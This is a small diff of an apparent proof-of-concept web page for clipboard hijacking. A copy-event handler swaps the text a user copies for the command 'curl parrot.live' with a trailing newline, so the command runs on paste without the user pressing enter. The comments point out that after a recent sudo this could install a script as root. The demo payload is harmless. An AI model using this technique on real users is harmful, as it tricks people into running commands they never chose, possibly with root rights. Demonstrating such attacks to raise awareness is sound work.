@@ -19,7 +19,7 @@
     document.getElementById('copyme').addEventListener('copy', function (e) {
         /*
             When the user will copy the text with the id "copyme", this bit of code will replace
-            it with the payload.
+            it with the payload. He doesn't even have to press enter thanks to the '\n' !
         */
         e.clipboardData.setData('text/plain', 'curl parrot.live\n');
         // Imagine if the user has done a regular sudo command before! You could easily make him install a script as root :D
